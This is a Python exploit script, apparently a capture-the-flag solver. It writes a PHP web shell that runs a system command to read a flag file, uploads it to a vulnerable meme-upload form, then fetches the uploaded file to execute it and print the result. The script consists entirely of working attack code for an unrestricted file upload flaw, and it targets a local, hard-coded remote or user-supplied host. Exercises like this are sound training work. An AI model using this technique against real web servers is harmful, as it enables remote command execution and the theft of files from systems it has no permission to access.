import sys, requests, re, os, string, random

def get_url(args):
    port = "8003"
    if len(args) == 2 and args[1] == "local":
        return f"http://127.0.0.1:{port}"
    elif len(args) == 2 and args[1] == "remote":
        return f"http://141.85.224.105:{port}"
    elif len(args) == 3:
        return f"http://{args[1]}:{args[2]}"
    else:
        sys.exit(1)

def random_filename():
    return ''.join(random.choices(string.ascii_letters + string.digits, k = 16)) + ".php"

def main():
    url = get_url(sys.argv)
    filename = random_filename()

    with open(filename, "w") as f:
        f.write('<?php echo system("cat ../flag.txt"); ?>')

    files = {
        'fileToUpload': (filename, open(filename, 'rb'), 'application/x-php'),
    }
    data = {'submit': 'Upload meme'}
    try:
        response = requests.post(url, files=files, data=data)
    except Exception as e:
        print(e)
        os.remove(filename)
        sys.exit(1)

    os.remove(filename)

    match = re.search(r"Your file ([^ ]+)", response.text)
    if not match:
        sys.exit(1)

    new_filename = match.group(1)

    try:
        flag_response = requests.get(f"{url}/uploads/{new_filename}")
        print(flag_response.text.strip())
    except Exception as e:
        print(e)

if __name__ == "__main__":
    main()
